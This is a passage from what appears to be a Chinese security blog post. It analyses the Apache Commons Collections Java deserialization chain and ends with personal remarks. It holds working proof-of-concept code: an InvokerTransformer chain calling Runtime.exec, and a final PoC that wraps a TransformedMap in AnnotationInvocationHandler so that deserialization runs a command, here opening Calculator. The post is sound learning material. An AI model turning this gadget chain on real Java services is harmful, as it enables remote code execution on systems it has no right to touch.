</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    "exec", 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    new Class[] { String.class }, 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    new Object[] { "open /System/Applications/Calculator.app" }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>)
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>Class cls = object.getClass();
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>Method method = cls.getMethod("exec", new Class[] { String.class });
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>return method.invoke(object, new Object[] { "open /System/Applications/Calculator.app" });
</div></div></div></pre>
<p>所以代码执行这一套就分析到这里，另一个关键的问题是，我们如何触发这一套流程呢？</p>
<p>这里涉及到了一个<code>TransformedMap</code>类，这个类是对Java数据结构Map的扩展，当<code>TransformedMap</code>内元素发生变化时，会触发自定义的<code>Transformer</code></p>
<p>本地测试如下</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>public class SerialBug {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    public static void main(String[] args) throws Exception {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    Transformer[] transformers = new Transformer[] {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    new ConstantTransformer(Runtime.class),
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "open /System/Applications/Calculator.app" }) };
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    Transformer transformerChain = new ChainedTransformer(transformers);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    Map map = new HashMap();
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    map.put("KEY", "VALUE");
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    Map&lt;String, Object&gt; transformedMap = TransformedMap.decorate(map, null, transformerChain);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    for (Map.Entry&lt;String, Object&gt; entry : transformedMap.entrySet()) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    entry.setValue("NOVALUE");
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>}
</div></div></div></pre>
<p>弹出计算器</p>
<p><img src="resources/D671951CF14698D9246827D0744FAE29.jpg" alt="IMAGE" width="1679" height="1025"></p>
<p>它触发第一个<code>Transformer</code>的过程如下，首先修改<code>TransformedMap</code>的键值</p>
<p><img src="resources/4F8C13E52ECCE599FEBB1D68877C0D9D.jpg" alt="IMAGE" width="1680" height="1027"></p>
<p>调用<code>checkSetValue()</code></p>
<p><img src="resources/BC049CDA671F60DFEF78A7B8C16CBCE6.jpg" alt="IMAGE" width="1680" height="1027"></p>
<p>触发了<code>Transformer</code>，于是开始执行我们定义的<code>ChainedTransformer</code></p>
<p><img src="resources/ED32EDEF6B19E2C3A7F439043E8EDCF8.jpg" alt="IMAGE" width="1680" height="1027"></p>
<p>这里是自己去写代码触发，如果是利用Apache Commons Collections库里现有的代码来触发呢？</p>
<p>我们看到上面使用的是修改Map的键值，在Apache Commons Collections里，存在一个类<code>sun.reflect.annotation.AnnotationInvocationHandler</code>，它实现了<code>readObject()</code>，而且调用了<code>setValue()</code>，刚刚好！</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>class AnnotationInvocationHandler implements InvocationHandler, Serializable {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    private void readObject(java.io.ObjectInputStream s)
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    throws java.io.IOException, ClassNotFoundException {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    s.defaultReadObject();
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    // Check to make sure that types have not evolved incompatibly
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span> 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    AnnotationType annotationType = null;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    try {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    annotationType = AnnotationType.getInstance(type);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    } catch(IllegalArgumentException e) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    // Class is no longer an annotation type; all bets are off
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    return;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span> 
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    String name = memberValue.getKey();
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    Class&lt;?&gt; memberType = memberTypes.get(name);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    if (memberType != null) {  // i.e. member still exists
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    Object value = memberValue.getValue();
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    if (!(memberType.isInstance(value) ||
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    value instanceof ExceptionProxy)) {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    memberValue.setValue(
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    new AnnotationTypeMismatchExceptionProxy(
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    value.getClass() + "[" + value + "]").setMember(
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    annotationType.members().get(name)));
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>}
</div></div></div></pre>
<p>最终的测试Poc</p>
<pre><div class="ace-tomorrow-night-eighties"><div class="ace_static_highlight ace_show_gutter" style="counter-reset:ace_line 0"><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>public class SerialBug {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    public static void main(String[] args) throws Exception {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    // <span class="ace_cjk" style="width:NaNpx">序</span><span class="ace_cjk" style="width:NaNpx">列</span><span class="ace_cjk" style="width:NaNpx">化</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(new File("SerialBug")));
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    objectOutputStream.writeObject(get());
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    objectOutputStream.flush();
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    objectOutputStream.close();
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    // <span class="ace_cjk" style="width:NaNpx">反</span><span class="ace_cjk" style="width:NaNpx">序</span><span class="ace_cjk" style="width:NaNpx">列</span><span class="ace_cjk" style="width:NaNpx">化</span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(new File("SerialBug")));
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    objectInputStream.readObject();
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    objectInputStream.close();
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    public static Object get() throws NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    Transformer[] transformers = new Transformer[] {
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    new ConstantTransformer(Runtime.class),
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span><span class="ace_indent-guide">    </span>    new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "open /System/Applications/Calculator.app" }) };
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    Transformer transformerChain = new ChainedTransformer(transformers);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    Map map = new HashMap();
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    map.put("KEY", "VALUE");
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    Map&lt;String, Object&gt; transformedMap = TransformedMap.decorate(map, null, transformerChain);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    ctor.setAccessible(true);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    Object instance = ctor.newInstance(Retention.class, transformedMap);
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span><span class="ace_indent-guide">    </span>    return instance;
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>    }
</div><div class="ace_line"><span class="ace_gutter ace_gutter-cell" unselectable="on"></span>}
</div></div></div></pre>
<p>以上分析仅仅是拾人牙慧，有很多理解不到位的地方，有兴趣学习的同学可以移步以上提到的文章链接，原汁原味，更加详细</p>
<p>学习Java反序列化漏洞的时候，搜到一个Java安全相关的GitHub项目，先在这里做个记录</p>
<ul>
<li><a href="https://github.com/threedr3am/learnjavabug">https://github.com/threedr3am/learnjavabug</a></li>
</ul>
<p>然后我依旧在学习的是scz的若干篇文章《Java RMI入门 1-5》，向小四学习！</p>
<ul>
<li><a href="http://scz.617.cn/network/202002221000.txt">http://scz.617.cn/network/202002221000.txt</a></li>
<li><a href="http://scz.617.cn/network/202003081810.txt">http://scz.617.cn/network/202003081810.txt</a></li>
<li><a href="http://scz.617.cn/network/202003121717.txt">http://scz.617.cn/network/202003121717.txt</a></li>
<li><a href="http://scz.617.cn/network/202003191728.txt">http://scz.617.cn/network/202003191728.txt</a></li>
<li><a href="http://scz.617.cn/network/202003241127.txt">http://scz.617.cn/network/202003241127.txt</a></li>
</ul>
<p>我多佩服小四这里就不过多的描述了，我在很多篇文章里都曾表达过我对大佬的崇拜，希望有生之年能追赶上大佬的脚步</p>
<p>我挺感谢我认识的几个师傅，会客观的从旁观者角度给我一些职业发展上的建议，比如让我考虑去研究型的安全团队，其实我有时候也会想，如果我毕业后待在一个研究型的安全团队安心待三年到五年，身边都是每天研究漏洞到凌晨的大佬，现在会不会有很棒的产出呢？</p>
<p>我是一个乐观的人，虽说现在搞业务安全，但无论在哪，都能调整好学习进度，只要热爱技术，一点不影响我每天都在好好学习呀:)</p>
<p>从某些小渠道听到我司开始大面积优化了，大家说录音笔啥牌子好</p>
<p>说来不怕大家笑话，我弄了本《机械制图》，想学习四足机器人，自学一下打打基础</p>
<p>老了之后，锯锯木头，磨磨砂纸，安安静静，一坐一下午</p>
<p>周末愉快:)</p>
</div></div>
      <script></script>
    </body>
    </html>
  